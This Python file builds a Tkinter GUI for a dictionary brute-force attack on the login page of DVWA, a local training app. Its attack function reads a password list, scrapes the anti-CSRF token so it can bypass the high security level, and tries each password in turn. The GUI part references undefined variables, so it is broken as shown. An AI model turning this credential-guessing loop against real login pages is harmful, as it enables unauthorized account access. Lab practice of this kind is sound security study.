from utils import *
import sys

import tkinter as tk
from tkinter import ttk
from tkinter import *

import subprocess
import os

current_directory = os.getcwd()
process = None




####ATTACK

def get_passwords(filename):
    q = []
    with open(filename, 'r') as f:
        for e in f.read().split("\n"):
            q.append(e)

    return q

def send_credentials(session, url, data):

    target_url = url
    for k, v in data.items():
        target_url+=f"{k}={v}&"
    target_url = target_url[:-1]+"#"
    response = session.get(target_url)   
    return response

def attack():
    BASE_URL = "http://127.0.0.1/dvwa"
    bruteforce_url = f"{BASE_URL}/vulnerabilities/brute?"
    filename = "password.txt"
    username = "admin"

    q = get_passwords(filename)

    with DVWASessionProxy(BASE_URL) as s:
        s.security = SecurityLevel.HIGH
        for password in q:
                      
            data = {
            "username": username,
            "password": password,
            "Login": "Login"
            }

            if s.security is SecurityLevel.HIGH.value:

                response = s.get(bruteforce_url)
                soup = BeautifulSoup(response.text, 'html.parser')
                user_token = soup.find("input", attrs= {"name": "user_token"})["value"]
                data["user_token"] = user_token
            response = send_credentials(s, bruteforce_url, data)
            print(" "*40, end="\r")
            print(f"[!] Testing: {password}", end="\r")
            listbox.insert("Testing", str(password))
            if "password incorrect." not in response.text:
                print("")
                print(f"[+] Found: {password}")
                listbox.insert("Found", str(password))
                updateResult()
                break

def updateResult():
	rtext = " [ Target ] ~ " + str(password)
	L27.configure(text = rtext)

        

####

###GUI

def run_program():
    global process
    try:
        process = subprocess.Popen(["python3", current_directory+"/brute_force/brute_force_main.py"])
    except FileNotFoundError:
        print("Error: The specified Python program was not found.")
    except Exception as e:
        print("An error occurred:", e)

def stop_program():
    global process
    if process:
        process.terminate()
        process = None

def toggle_switch():
    global switch_state
    if switch_state:
        switch_button.config(text="RUN ATTACK", style="SwitchButton.Off.TButton")
        stop_program()
    else:
        switch_button.config(text="CALCEN ATTACK", style="SwitchButton.On.TButton")
        #run_program()
        attack()
    switch_state = not switch_state

def create_window():
    global switch_state
    switch_state = False

    # Create the main window
    root = tk.Tk()
    root.title("BRUTE FORCE ATTACK")

    root.geometry("400x500")  # Width x Height
    root.resizable(True,True)

    # Create the style for the switch button
    style = ttk.Style()
    style.configure("SwitchButton.On.TButton", foreground="red")
    style.configure("SwitchButton.Off.TButton", foreground="green")

    # Create the switch (Button)
    global switch_button
    switch_button = ttk.Button(root, text="RUN ATTACK", style="SwitchButton.Off.TButton", command=toggle_switch)
    switch_button.grid(ipadx=50, ipady=30 )
    switch_button.place(x=150, y=50)
    # switch_button.pack(pady=50)

    L26 = Label(gui, text = "Results: ")
    L26.place(x = 16, y = 220)
    L27 = Label(gui, text = "[ ... ]")
    L27.place(x = 180, y = 22)

    
    # Text box
    frame = Frame(root)
    frame.place(x = 16, y = 275, width = 370, height = 215)
    listbox = Listbox(frame, width = 59, height = 6)
    listbox.place(x = 0, y = 0)
    listbox.bind('<<ListboxSelect>>')
    scrollbar = Scrollbar(frame)
    scrollbar.pack(side=RIGHT, fill=Y)
    listbox.config(yscrollcommand=scrollbar.set)
    scrollbar.config(command=listbox.yview)

    # Run the main event loop
    root.mainloop()

###


if __name__ == "__main__":
    create_window()
